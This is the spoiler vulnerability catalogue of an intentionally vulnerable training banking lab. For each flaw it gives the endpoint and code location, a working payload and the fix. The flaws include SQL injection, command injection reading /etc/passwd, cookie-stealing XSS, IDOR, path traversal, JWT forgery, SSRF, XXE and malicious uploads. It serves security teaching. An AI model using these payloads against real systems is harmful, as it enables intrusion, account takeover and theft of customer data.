# Katalog Kerentanan — NusaBank Lab

> **⚠ SPOILER.** Dokumen ini membongkar semua celah latihan beserta payload-nya.
> Baca hanya setelah Anda mencoba menemukannya sendiri, atau saat Anda terjebak.
> Untuk panduan langkah demi langkah, lihat [`WALKTHROUGH.md`](WALKTHROUGH.md).

Setiap celah dikendalikan oleh satu tabel pusat di `app/lab.py` (`FEATURE_MATRIX`).
Kode yang rentan ditandai komentar `# VULN: <nama>`, dan versi amannya ditandai
`# FIX:` tepat di sebelahnya — jadi setiap baris di bawah bisa Anda telusuri
langsung dari source code.

**Legenda level:** `E` = easy, `M` = medium, `H` = hard, `P` = patched (selalu aman).

- **E / M / H** → celah aktif
- **—** → sudah ditutup pada level tersebut

Seluruh endpoint relatif terhadap `http://127.0.0.1:8080`.

---

## 1. Injeksi (OWASP A03:2021)

### 1.1 SQL Injection — Login nasabah
| | |
|---|---|
| **Fitur** | `sqli_login` |
| **Endpoint** | `POST /login` |
| **Level** | E M — — · aman di `hard`, `patched` |
| **Lokasi kode** | `app/routes_auth.py:96` |
| **Payload** | username `admin' --`, password apa saja |
| **Dampak** | Bypass autentikasi; `admin' UNION SELECT ...` bisa membaca tabel lain |
| **Perbaikan** | Query berparameter + verifikasi hash constant-time |

### 1.2 SQL Injection — Login panel admin
| | |
|---|---|
| **Fitur** | `sqli_login` (jalur admin) |
| **Endpoint** | `POST /admin/login` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_admin.py:182` |
| **Payload** | username `admin' --`, password `x` |
| **Dampak** | Masuk back-office tanpa kredensial sah |
| **Perbaikan** | Query berparameter |

### 1.3 SQL Injection — Pencarian berita
| | |
|---|---|
| **Fitur** | `sqli_search` |
| **Endpoint** | `GET /berita?q=` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_public.py:244` |
| **Payload easy/medium** | `x%') UNION SELECT id,username,password_hash,email,phone,address,1,'2024-01-01' FROM users--` |
| **Payload hard** | `zzzzz' OR 1=1 OR '` — blacklist `UNION`, `--`, `/*`, `;` bersifat case-sensitive sehingga payload ini lolos |
| **Dampak** | Ekstraksi data seluruh tabel (kredensial, hash, `address` berisi flag) |
| **Perbaikan** | `LIKE ?` berparameter (`app/routes_public.py:262`) |

### 1.4 SQL Injection — Pencarian nasabah di panel admin
| | |
|---|---|
| **Fitur** | `sqli_search` |
| **Endpoint** | `GET /admin/users?q=` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_admin.py:325` |
| **Payload** | `%' OR 1=1 AND u.full_name LIKE '` (hard) · `x%') UNION SELECT id,username,password_hash,email,phone,kyc_status,is_active,created_at,'admin',1,1 FROM users--` (easy/medium & hard) |
| **Dampak** | Menampilkan seluruh nasabah; UNION dapat mengekstrak hash password |
| **Perbaikan** | Query berparameter |

### 1.5 SQL Injection — Filter tanggal riwayat transaksi
| | |
|---|---|
| **Fitur** | `sqli_transactions` |
| **Endpoint** | `GET /transactions?start=&end=&q=` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_transactions.py:253`, `:275` |
| **Payload easy/medium** | `q=' OR '1'='1` (tautologi) · `start=2020-01-01'` → HTTP 500 + traceback (error-based) |
| **Payload hard** | `start=2099-01-01' OR '1'='1` mengembalikan seluruh baris. Time-based: `start=2024-01-01' AND 1=(SELECT COUNT(*) FROM transactions t1, transactions t2, transactions t3) AND '1'='1` (≈16 detik vs 0,1 detik normal) |
| **Dampak** | Melihat transaksi seluruh nasabah; ekstraksi data bertahap |
| **Perbaikan** | Semua nilai difilter memakai `?` |

### 1.6 SQL Injection — Filter transaksi back-office
| | |
|---|---|
| **Fitur** | `sqli_transactions` |
| **Endpoint** | `GET /admin/transactions?q=&start=&end=` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_admin.py:608`, `:632` |
| **Payload** | Sama seperti 1.5 |
| **Dampak** | Ekspor CSV seluruh transaksi bank |

### 1.7 Command Injection — Diagnostik jaringan
| | |
|---|---|
| **Fitur** | `command_injection` |
| **Endpoint** | `POST /admin/diagnostics` (field `host`) |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_admin.py:893` |
| **Payload easy** | `127.0.0.1; id` · `127.0.0.1 | cat /etc/passwd` |
| **Payload medium** | `127.0.0.1 | echo PWNED` — blacklist tidak memuat pipe tunggal `\|` maupun `&` tunggal |
| **Dampak** | Remote Command Execution di dalam container (baca `db/nusabank.db`, `uploads/legacy/flag.txt`) |
| **Perbaikan** | `subprocess.run(argv_list, shell=False)` + validasi `^[A-Za-z0-9._:-]{1,253}$` |

---

## 2. Cross-Site Scripting (OWASP A07:2021)

### 2.1 Reflected XSS — Pencarian transaksi
| | |
|---|---|
| **Fitur** | `xss_reflected` |
| **Endpoint** | `GET /transactions?q=` |
| **Level** | E M H — |
| **Lokasi kode** | `templates/transactions/history.html:16` |
| **Payload** | `<script>alert(document.cookie)</script>` |
| **Dampak** | Pencurian cookie sesi (cookie **tidak** `HttpOnly` di easy/medium) |
| **Perbaikan** | Autoescape Jinja (hapus `\|safe`) + CSP `script-src 'self'` |

### 2.2 Reflected XSS — Pencarian berita
| | |
|---|---|
| **Fitur** | `xss_reflected` |
| **Endpoint** | `GET /berita?q=` |
| **Level** | E M H — |
| **Lokasi kode** | `templates/public/news.html:19` |
| **Payload** | `<img src=x onerror=alert(1)>` |
| **Dampak** | Eksekusi JavaScript pada origin bank |

### 2.3 Reflected XSS — Formulir kontak
| | |
|---|---|
| **Fitur** | `xss_reflected` |
| **Endpoint** | `POST /kontak` (field `name`) |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_public.py:325`, `templates/public/contact.html:18` |
| **Payload** | `<img src=x onerror=alert(document.cookie)>` |
| **Dampak** | XSS tanpa perlu autentikasi — link jebakan cukup dikirim ke korban |

### 2.4 Stored XSS — Deskripsi transaksi
| | |
|---|---|
| **Fitur** | `xss_stored` |
| **Endpoint** | `POST /transfer` (field `description`) → `GET /transactions` |
| **Level** | E M H — |
| **Lokasi kode** | `templates/transactions/history.html:90` |
| **Payload** | `<img src=x onerror=alert(document.cookie)>` |
| **Dampak** | Payload tersimpan di database dan dieksekusi setiap kali mutasi dibuka |

### 2.5 Stored XSS — Tiket dukungan
| | |
|---|---|
| **Fitur** | `ticket_xss` |
| **Endpoint** | `POST /support/new`, `POST /support/<id>/comment` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_tickets.py:90`, `templates/tickets/detail.html` |
| **Payload** | `<svg onload=alert(document.cookie)>` pada subjek/isi |
| **Dampak** | XSS ke staf CS saat membuka tiket di panel admin |

### 2.6 DOM-based XSS — Hero halaman utama
| | |
|---|---|
| **Fitur** | `xss_dom` |
| **Endpoint** | `GET /#<payload>` |
| **Level** | E M H — |
| **Lokasi kode** | `static/js/app.js:53` (`domGreeting`), elemen `#dom-greeting` di `templates/public/index.html` |
| **Payload** | `http://127.0.0.1:8080/#<img src=x onerror=alert(document.cookie)>` |
| **Dampak** | Eksekusi JS murni di sisi klien; tidak terlihat oleh log server |
| **Perbaikan** | `textContent` + batas panjang (`patched`) |

---

## 3. Kontrol Akses (OWASP A01:2021)

### 3.1 IDOR — Riwayat & detail transaksi
| | |
|---|---|
| **Fitur** | `idor_transactions` |
| **Endpoint** | `GET /transactions?account_id=`, `GET /transactions/<id>`, `GET /transactions/<id>/receipt` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_transactions.py:303`, `:393`; `app/routes_dashboard.py:38` |
| **Payload** | `GET /transactions?account_id=2` (milik ani02) |
| **Dampak** | Melihat mutasi dan saldo rekening nasabah lain, termasuk struk |

### 3.2 IDOR — Dokumen KYC
| | |
|---|---|
| **Fitur** | `idor_kyc` |
| **Endpoint** | `GET /kyc/download/<id>` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_uploads.py:75` |
| **Payload** | `GET /kyc/download/1` lalu iterasi id 1..14 |
| **Dampak** | Mengunduh KTP/NPWP/selfie nasabah lain (data pribadi) |

### 3.3 IDOR — Klaim asuransi
| | |
|---|---|
| **Fitur** | `idor_claims` |
| **Endpoint** | `GET /insurance/claim/<id>`, `GET .../attachment`, `POST /insurance/claim` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_claims.py:72`, `:150` |
| **Payload** | `GET /insurance/claim/2`, atau ajukan klaim dengan `policy_id` milik orang lain |
| **Dampak** | Membaca klaim nasabah lain dan mengajukan klaim atas polis orang lain |

### 3.4 IDOR — Tiket dukungan
| | |
|---|---|
| **Fitur** | `idor_tickets` |
| **Endpoint** | `GET /support/<id>` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_tickets.py:121` |
| **Payload** | `GET /support/2` |
| **Dampak** | Membaca percakapan nasabah lain; dapat membalas sebagai penyusup |
| **Perbaikan** | Bandingkan `ticket.user_id` dengan sesi (admin dikecualikan) |

### 3.5 IDOR — Profil via REST API
| | |
|---|---|
| **Fitur** | `idor_profile` |
| **Endpoint** | `GET /api/v1/profile?user_id=` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_api.py:240` |
| **Payload** | `GET /api/v1/profile?user_id=1` dengan token milik budi01 |
| **Dampak** | Membaca profil dan `address` admin — berisi `FLAG{flag_in_database}` |

### 3.6 IDOR — Saldo & transaksi via REST API
| | |
|---|---|
| **Fitur** | `idor_transactions` |
| **Endpoint** | `GET /api/v1/balance?account_id=`, `GET /api/v1/transactions?account_id=` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_api.py:185`, `:213` |
| **Payload** | `GET /api/v1/balance?account_id=2` |

### 3.7 Akses panel admin tanpa role
| | |
|---|---|
| **Fitur** | `admin_no_role_check` |
| **Endpoint** | `GET /admin/`, seluruh `/admin/*` |
| **Level** | E M — — |
| **Lokasi kode** | `app/utils.py:30`, `app/routes_admin.py:104` |
| **Payload** | Login `budi01:password`, lalu buka `/admin/` |
| **Dampak** | Nasabah biasa mendapat seluruh hak administrator, termasuk flag panel |
| **Perbaikan** | Cek role server-side di setiap request |

### 3.8 Pemisahan tugas back-office tidak ditegakkan
| | |
|---|---|
| **Fitur** | `admin_role_separation` |
| **Endpoint** | `POST /admin/claims/<id>/review`, `POST /admin/kyc/<id>/review`, `POST /admin/settings` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_admin.py:131`, matriks `PERMISSIONS` di `:58` |
| **Payload** | Login `cs123:NusaCS!2024` (role `admin_cs`), lalu setujui klaim dan ubah pengaturan |
| **Dampak** | CS yang seharusnya hanya menangani tiket bisa menyetujui klaim dan mengganti `webhook_secret` |
| **Perbaikan** | Matriks `PERMISSIONS` hanya ditegakkan pada `patched` |

### 3.9 Mass Assignment — Profil nasabah
| | |
|---|---|
| **Fitur** | `mass_assignment` |
| **Endpoint** | `POST /profile/edit` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_dashboard.py:107` |
| **Payload** | `full_name=Ani&email=ani02@example.com&role_id=2&kyc_status=verified` |
| **Dampak** | Eskalasi hak menjadi `admin` (role_id 2) dari akun nasabah |
| **Perbaikan** | Allowlist kolom eksplisit |

### 3.10 Mass Assignment — Detail nasabah di admin
| | |
|---|---|
| **Fitur** | `mass_assignment` |
| **Endpoint** | `POST /admin/users/<id>` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_admin.py:398`, `:404` |
| **Payload** | `role_id=2` pada form edit nasabah |
| **Dampak** | Promosi akun menjadi administrator |
| **Perbaikan** | Whitelist `EDITABLE_USER_COLUMNS` |

### 3.11 Mass Assignment — Pengaturan sistem
| | |
|---|---|
| **Fitur** | `mass_assignment` |
| **Endpoint** | `POST /admin/settings` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_admin.py:818` |
| **Payload** | easy/medium: `flag_admin_panel=...` & `webhook_secret=pwned`. hard: `backdoor_enabled=1` (blacklist hanya memblokir prefiks `flag_`, kunci baru tetap masuk) |
| **Dampak** | Mengubah secret webhook (memalsukan signature) dan menyisipkan kunci konfigurasi baru |
| **Perbaikan** | `SAFE_SETTING_KEYS` |

### 3.12 Manipulasi HTTP Method — Transfer via GET
| | |
|---|---|
| **Fitur** | `http_method_tampering` |
| **Endpoint** | `GET /transfer/quick` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_transactions.py:206` |
| **Payload** | `GET /transfer/quick?account_id=1&dest_account=1000000521&amount=1000` |
| **Dampak** | Transfer dana hanya dengan mengunjungi URL — cukup `<img src>` untuk memicu, melewati token CSRF |

### 3.13 Path Traversal — Penyimpanan berkas
| | |
|---|---|
| **Fitur** | `path_traversal` |
| **Endpoint** | `GET /uploads/<path>`, `GET /admin/files?name=` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_uploads.py:22`, `app/routes_admin.py:860`, `app/security.py:312` |
| **Payload** | `/uploads/../../db/nusabank.db` · `/uploads/legacy/flag.txt` · `/admin/files?name=../../../../etc/passwd` |
| **Dampak** | Membaca file apa pun yang bisa dibaca proses (database, flag, `/etc/passwd`) |
| **Perbaikan** | `os.path.realpath` + `commonpath` |

### 3.14 Open Redirect — Parameter `next`
| | |
|---|---|
| **Fitur** | `open_redirect` |
| **Endpoint** | `GET/POST /login?next=` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_auth.py:41` |
| **Payload** | `/login?next=https://evil.example/phish` (hard: `//evil.example/phish` lolos karena hanya dicek `startswith("/")`) |
| **Dampak** | Phishing dengan domain bank sebagai perantara |
| **Perbaikan** | `is_safe_redirect()` — hanya path relatif same-origin |

---

## 4. Autentikasi & Sesi (OWASP A07 / A02:2021)

### 4.1 Kebijakan password lemah
| | |
|---|---|
| **Fitur** | `weak_password_policy` |
| **Endpoint** | `POST /register`, `POST /change-password` |
| **Level** | E M — — |
| **Lokasi kode** | `app/security.py:53` |
| **Payload** | password `a` saat registrasi |
| **Dampak** | Akun dengan password 1 karakter |
| **Perbaikan** | Minimal 12 karakter + huruf besar/kecil/angka/simbol + blacklist |

### 4.2 Hash password lemah (MD5 tanpa salt)
| | |
|---|---|
| **Fitur** | `weak_password_hash` |
| **Endpoint** | Semua penyimpanan password/PIN + `users.password_hash` |
| **Level** | E M — — |
| **Lokasi kode** | `app/security.py:28` |
| **Payload** | `echo -n password \| md5sum` → `5f4dcc3b5aa765d61d8327deb882cf99`; cocokkan dengan hash hasil SQLi |
| **Dampak** | Seluruh kredensial dapat di-crack dalam hitungan detik |
| **Perbaikan** | bcrypt dengan salt per password |

### 4.3 User enumeration
| | |
|---|---|
| **Fitur** | `user_enumeration` |
| **Endpoint** | `POST /login`, `POST /forgot-password`, `POST /register`, `POST /api/v1/auth/token` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_auth.py:126`, `:193`; `app/routes_api.py:147` |
| **Payload** | Login `admin` vs `tidakada` → pesan berbeda ("Password salah." vs "Username tidak ditemukan.") |
| **Dampak** | Daftar username valid untuk brute-force |
| **Perbaikan** | Pesan generik "Username atau password salah." |

### 4.4 Tidak ada lockout akun
| | |
|---|---|
| **Fitur** | `no_account_lockout` |
| **Endpoint** | `POST /login` |
| **Level** | E M — — |
| **Lokasi kode** | `app/security.py:355` |
| **Payload** | Loop 10.000 percobaan password terhadap `budi01` |
| **Dampak** | Brute-force tanpa hambatan |
| **Perbaikan** | Kunci 15 menit setelah 5 kegagalan |

### 4.5 Token reset password dapat diprediksi
| | |
|---|---|
| **Fitur** | `predictable_reset_token` |
| **Endpoint** | `POST /forgot-password` → `GET /reset-password/<token>` |
| **Level** | E M — — |
| **Lokasi kode** | `app/security.py:172`, `app/routes_auth.py:246` |
| **Payload** | Token = `<user_id>-<YYYYMMDD>`, mis. `4-20261109`; link juga dicetak di halaman |
| **Dampak** | Ambil alih akun siapa pun tanpa akses email |
| **Perbaikan** | `secrets.token_urlsafe(32)` + pengiriman out-of-band |

### 4.6 Session fixation
| | |
|---|---|
| **Fitur** | `session_fixation` |
| **Endpoint** | `POST /login` |
| **Level** | E M — — |
| **Lokasi kode** | `app/security.py:102` |
| **Payload** | Tetapkan cookie `nusabank_session` sebelum login; ID tidak dirotasi (`_fix=pre-auth` tetap ada) |
| **Dampak** | Penyerang yang memegang cookie pra-login ikut masuk |
| **Perbaikan** | `session.clear()` lalu ID baru setelah autentikasi |

### 4.7 Remember-me dapat dipalsukan
| | |
|---|---|
| **Fitur** | `insecure_remember` |
| **Endpoint** | Cookie `nb_remember` |
| **Level** | E M — — |
| **Lokasi kode** | `app/security.py:121`, `:142` |
| **Payload** | `curl -b 'nb_remember=4' http://127.0.0.1:8080/dashboard` |
| **Dampak** | Login sebagai user id mana pun tanpa password |
| **Perbaikan** | Selector + validator acak yang disimpan sebagai hash |

### 4.8 Token JWT lemah
| | |
|---|---|
| **Fitur** | `weak_jwt` |
| **Endpoint** | `POST /api/v1/auth/token`, seluruh `/api/v1/*` |
| **Level** | E M — — |
| **Lokasi kode** | `app/security.py:189`, `:202`; `app/lab.py:147` |
| **Payload** | Secret `nusabank123` → forge HS256 `{"sub":"1"}`; atau header `alg=none` dengan signature kosong |
| **Dampak** | Impersonasi `admin` (id 1) → `FLAG{flag_in_database}` via `/api/v1/profile` |
| **Perbaikan** | Secret kuat + algoritma dipin + klaim `exp` wajib |

### 4.9 PIN transfer dapat dilewati
| | |
|---|---|
| **Fitur** | `pin_bypass` |
| **Endpoint** | `POST /transfer`, `POST /profile/pin` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_transactions.py:86`, `app/routes_dashboard.py:167` |
| **Payload** | Kirim `pin=` (kosong) atau hapus field `pin` sama sekali |
| **Dampak** | Transfer tanpa PIN — melewati faktor kedua |
| **Perbaikan** | PIN wajib dan selalu diverifikasi |

---

## 5. Kelemahan Kriptografi & Konfigurasi (A02 / A05:2021)

### 5.1 Cookie sesi tanpa flag keamanan
| | |
|---|---|
| **Fitur** | `insecure_cookies` |
| **Endpoint** | Header `Set-Cookie` |
| **Level** | E M — — |
| **Lokasi kode** | `app/__init__.py:54` |
| **Payload** | `curl -I http://127.0.0.1:8080/` → tidak ada `HttpOnly`, `Secure`, `SameSite` |
| **Dampak** | Cookie dicuri lewat XSS dan ikut terkirim di HTTP polos |
| **Perbaikan** | `HttpOnly` + `SameSite=Lax` + `Secure` |

### 5.2 Security header tidak ada
| | |
|---|---|
| **Fitur** | `missing_security_headers` |
| **Endpoint** | Semua respons |
| **Level** | E M — — |
| **Lokasi kode** | `app/__init__.py:216` |
| **Payload** | `curl -I http://127.0.0.1:8080/login` → tanpa CSP, X-Frame-Options, HSTS |
| **Dampak** | Clickjacking dan tidak ada lapisan mitigasi XSS |
| **Perbaikan** | CSP, `X-Frame-Options: DENY`, `nosniff`, HSTS, Permissions-Policy |

### 5.3 CORS terlalu permisif
| | |
|---|---|
| **Fitur** | `permissive_cors` |
| **Endpoint** | `/api/v1/*` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_api.py:102` |
| **Payload** | `curl -H 'Origin: https://evil.example' -i /api/v1/ping` → `ACAO: https://evil.example` + `Allow-Credentials: true` |
| **Dampak** | Situs penyerang membaca respons API terautentikasi |
| **Perbaikan** | Hanya origin sendiri, tanpa wildcard |

### 5.4 Header server terlalu informatif
| | |
|---|---|
| **Fitur** | `verbose_server_header` |
| **Endpoint** | Semua respons |
| **Level** | E M — — |
| **Lokasi kode** | `app/__init__.py:210` |
| **Payload** | `curl -I /` → `X-Powered-By: Flask/3.0.3 Python/3.11 Werkzeug/3.0.3` |
| **Dampak** | Fingerprinting stack, memudahkan pencarian CVE |

### 5.5 Error verbose
| | |
|---|---|
| **Fitur** | `verbose_errors` |
| **Endpoint** | Halaman 500 + `/admin/users`, `/wallet` |
| **Level** | E M — — |
| **Lokasi kode** | `app/__init__.py:94`, `:118`; `app/routes_admin.py:369`; `app/routes_webhook.py:172` |
| **Payload** | `GET /transactions?start=2020-01-01'` → traceback Python lengkap |
| **Dampak** | Path file, versi library, potongan query SQL |

### 5.6 Endpoint debug terbuka
| | |
|---|---|
| **Fitur** | `debug_endpoint` |
| **Endpoint** | `GET /debug` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_public.py:405` |
| **Payload** | Kunjungi `/debug` → variabel environment, path DB, konfigurasi |
| **Dampak** | Disclosure konfigurasi dan layout filesystem |

### 5.7 Backup & metadata repo terekspos
| | |
|---|---|
| **Fitur** | `exposed_backup` |
| **Endpoint** | `GET /backup.zip`, `GET /.git/config` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_public.py:374`, `:390` |
| **Payload** | `curl -O /backup.zip && unzip -p backup.zip backup/env.txt` |
| **Dampak** | Kredensial DB/SMTP dan `FLAG{backup_archive_leaked}` |

### 5.8 robots.txt membocorkan endpoint internal
| | |
|---|---|
| **Fitur** | `sensitive_robots` |
| **Endpoint** | `GET /robots.txt` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_public.py:356` |
| **Payload** | Baca `/robots.txt` → daftar `/admin`, `/debug`, `/backup.zip`, `/.git/` |
| **Dampak** | Peta serangan gratis |

### 5.9 Upload berkas tidak aman
| | |
|---|---|
| **Fitur** | `insecure_upload` |
| **Endpoint** | `POST /profile/photo`, `POST /kyc/upload`, `POST /insurance/claim` |
| **Level** | E M — — |
| **Lokasi kode** | `app/security.py:274` |
| **Payload** | Nama berkas `shell.pdf.php` atau `x.svg` berisi `<svg onload=...>`; isi tidak dicek magic byte |
| **Dampak** | Berkas berbahaya mendarat di `uploads/` dan disajikan lewat `/uploads/<name>`; XSS via SVG |
| **Perbaikan** | Whitelist ekstensi + magic byte + nama acak |

### 5.10 SSRF — Webhook e-wallet
| | |
|---|---|
| **Fitur** | `ssrf_webhook` |
| **Endpoint** | `POST /wallet` (field `url`), `POST /wallet/<id>/test` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_webhook.py:124`, `:132`, `:162` |
| **Payload easy** | `http://127.0.0.1:8080/internal/metadata` · `file:///absolute/path/uploads/legacy/flag.txt` (requests tidak mendukung `file://`; gunakan URL http apa pun, termasuk host internal) |
| **Payload medium** | `http://127.0.0.1:8080/internal/metadata` — loopback literal tidak ada di blacklist (`localhost`, `169.254.169.254`, `file://`) |
| **Dampak** | Membaca endpoint internal, `FLAG{ssrf_internal_metadata_reached}`, dan `FLAG{internal_admin_api_exposed}` |
| **Perbaikan** | Skema http(s) saja + resolusi DNS + tolak IP privat/loopback/link-local |

### 5.11 Rate limit API tidak ada
| | |
|---|---|
| **Fitur** | `api_no_rate_limit` |
| **Endpoint** | `POST /api/v1/auth/token` |
| **Level** | E M — — |
| **Lokasi kode** | `app/security.py:338` |
| **Payload** | Loop Tak berbatas kredensial ke `/api/v1/auth/token` |
| **Dampak** | Brute-force password tanpa hambatan |

### 5.12 Rate limit dapat dilewati (hard)
| | |
|---|---|
| **Fitur** | `rate_limiting` |
| **Endpoint** | `POST /login`, `POST /admin/login` |
| **Level** | hard (sengaja dapat dilewati) |
| **Lokasi kode** | `app/security.py:226` |
| **Payload** | Tambahkan header `X-Forwarded-For: <IP acak>` setiap request |
| **Dampak** | Counter rate limit selalu di bucket baru |
| **Perbaikan** | Kunci limiter pada `remote_addr` (patched) |

### 5.13 CSRF
| | |
|---|---|
| **Fitur** | `csrf` |
| **Endpoint** | `POST /transfer`, `/profile/edit`, `/kontak`, `/change-password`, dll. |
| **Level** | E M — (hard: hanya multipart) |
| **Lokasi kode** | `app/security.py:80` |
| **Payload** | Form lintas situs tanpa `csrf_token`; pada **hard** cukup kirim sebagai `multipart/form-data` untuk melewati pengecekan |
| **Dampak** | Transfer dana, ubah profil, atau reset PIN atas nama korban |
| **Perbaikan** | Token per sesi + `SameSite=Lax` |

---

## 6. Logika Bisnis (A02 / A04:2021)

### 6.1 Transfer nominal negatif
| | |
|---|---|
| **Fitur** | `negative_transfer` |
| **Endpoint** | `POST /transfer` (field `amount`) |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_transactions.py:108` |
| **Payload** | `amount=-50000000` |
| **Dampak** | Saldo pengirim bertambah, saldo tujuan berkurang — uang diciptakan dari ketiadaan |
| **Perbaikan** | `amount > 0` dan batas harian |

### 6.2 Race condition — double spend
| | |
|---|---|
| **Fitur** | `race_condition` |
| **Endpoint** | `POST /transfer` (paralel) |
| **Level** | E M — (hard: jendela halus) |
| **Lokasi kode** | `app/routes_transactions.py:140`, `:162` |
| **Payload** | Kirim 6–10 request bersamaan dengan jumlah = seluruh saldo; tiap request membaca saldo yang sama |
| **Dampak** | Dana terkirim berkali-kali melebihi saldo (overdraft) |
| **Perbaikan** | `BEGIN IMMEDIATE` + cek ulang di dalam lock |

### 6.3 Nominal klaim melebihi pertanggungan
| | |
|---|---|
| **Fitur** | `claim_amount_bypass` |
| **Endpoint** | `POST /insurance/claim` |
| **Level** | E M — — |
| **Lokasi kode** | `app/routes_claims.py:78` |
| **Payload** | `amount=-1` atau `amount=999999999` (batas hanya atribut `max` di klien) |
| **Dampak** | Klaim negatif / melebihi `coverage` masuk ke antrean persetujuan |

### 6.4 Klaim kumulatif melebihi pertanggungan (hard)
| | |
|---|---|
| **Fitur** | `claim_cumulative_bypass` |
| **Endpoint** | `POST /insurance/claim` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_claims.py:90`, `:104` |
| **Payload** | Ajukan beberapa klaim masing-masing tepat di bawah `coverage` |
| **Dampak** | Total klaim melampaui nilai polis karena tiap klaim dicek terpisah |

### 6.5 Parameter kalkulator dapat dimanipulasi
| | |
|---|---|
| **Fitur** | `calc_parameter_tampering` |
| **Endpoint** | `POST /kalkulator` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_public.py:193`, `:201` |
| **Payload easy** | `rate=-50` atau `rate=0` (field tersembunyi dipercaya) |
| **Payload medium** | `dp=200000000&harga=150000000&tenor=36` → pokok negatif, angsuran `-Rp 1.743.056` |
| **Payload hard** | Hapus field `form_version`; validasi hanya berjalan bila nilainya `v2` |
| **Dampak** | Menghasilkan kuotasi kredit palsu tanpa bunga/angsuran negatif |
| **Perbaikan** | Validasi seluruh nilai di server (`_validate_financing`) |

### 6.6 Catatan internal klaim terekspos
| | |
|---|---|
| **Fitur** | `internal_note_exposure` |
| **Endpoint** | `GET /insurance/claim/<id>`, `GET /support/<id>` |
| **Level** | E M H — |
| **Lokasi kode** | `app/routes_claims.py:157`, `app/routes_tickets.py:127` |
| **Payload** | Buka detail klaim/tiket milik sendiri → catatan agen ikut tampil |
| **Dampak** | Bocornya penilaian internal antifraud dan catatan CS |
| **Perbaikan** | Filter `is_internal = 0` untuk nasabah |

### 6.7 XXE pada impor data — *kunci desain, tanpa endpoint*

| | |
|---|---|
| **Fitur** | `xxe_import` |
| **Endpoint** | — (dideklarasikan di `FEATURE_MATRIX`, tidak ada rute impor XML) |
| **Level** | E — — — |
| **Lokasi kode** | `app/lab.py:72` |
| **Payload** | `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///app/uploads/legacy/flag.txt">]><x>&e;</x>` |
| **Dampak** | *Design intent:* parser XML tanpa `resolve_entities=False` akan membaca berkas lokal. Tidak dapat dieksekusi di lab ini. |
| **Perbaikan** | Nonaktifkan DTD/entitas eksternal bila fitur impor ditambahkan |

### 6.8 Deserialisasi tidak aman — *kunci desain, tanpa endpoint*

| | |
|---|---|
| **Fitur** | `insecure_deserialization` |
| **Endpoint** | — (dideklarasikan di `FEATURE_MATRIX`, tidak ada jalur impor pickle) |
| **Level** | E M — — |
| **Lokasi kode** | `app/lab.py:73` |
| **Payload** | Pickle yang menjalankan `os.system('id')` saat dibuka (tidak ada sink di lab) |
| **Dampak** | *Design intent:* impor berkas biner akan menjadi RCE. Tidak dapat dieksekusi di lab ini. |
| **Perbaikan** | Gunakan JSON dan validasi skema |

---

## 7. Ringkasan per Level

| Level | Celah latihan aktif | Karakter |
|---|---:|---|
| `easy` | 45 | Semua terbuka; ini daftar periksa "apa yang bisa salah" |
| `medium` | 45 | Sama, dengan beberapa filter yang bisa dilewati |
| `hard` | 15 | Hanya celah halus: SQLi blacklist, mass assignment, RBAC back-office, negative amount, claim kumulatif, calc gate, open redirect, robots, dll. |
| `patched` | 0 | Referensi implementasi aman |

Dari 54 kunci di `FEATURE_MATRIX`: 6 adalah helper pertahanan berlapis
(`prepared_statements`, `rate_limiting`, `csrf_tokens`, `output_escaping`,
`jwt_expiry`, `atomic_transactions`) dan 2 bersifat kunci desain tanpa endpoint
(`xxe_import`, `insecure_deserialization`). Sisanya — 46 fitur — punya jalur kode nyata.

Celah yang **sengaja tetap ada di `hard`** (satu per modul):

| Modul | Celah | Payload kunci |
|---|---|---|
| Pencarian (publik & admin) | `sqli_search` | `zzzz' OR 1=1 OR '` |
| Filter tanggal | `sqli_transactions` | injeksi pada parameter `start` (error/time-based) |
| Mass assignment | `mass_assignment` | `role_id=2` / kunci settings baru |
| Back-office | `admin_role_separation` | `cs123` menyetujui klaim |
| Transfer | `negative_transfer` | `amount=-10000000` |
| Kredit | `calc_parameter_tampering` | hapus `form_version=v2` |
| Redirect | `open_redirect` | `//evil.example` |
| Discovery | `sensitive_robots` | daftar path internal |
| XSS | `xss_reflected` / `xss_stored` / `xss_dom` | sama seperti easy |
| IDOR | `idor_transactions` / `idor_profile` | enumerasi id |
| Klaim | `claim_cumulative_bypass` | banyak klaim kecil |
| Catatan internal | `internal_note_exposure` | buka detail tiket milik sendiri |

---

## 8. Cara Memverifikasi Perbaikan

```bash
# 1. Jalankan di level mudah, catat perilaku rentan
LAB_LEVEL=easy docker compose up --build

# 2. Ulangi payload yang sama di level aman
LAB_LEVEL=patched docker compose up --build
```

Atau jalankan harness otomatis yang dipakai saat pengembangan:

```bash
python scripts/stage4_check.py   # transaksi, IDOR, race, PIN, XSS
python scripts/stage5_check.py   # upload, KYC, klaim, tiket
python scripts/stage6_check.py   # SSRF, JWT, CORS, rate limit
python scripts/stage7_check.py   # panel admin
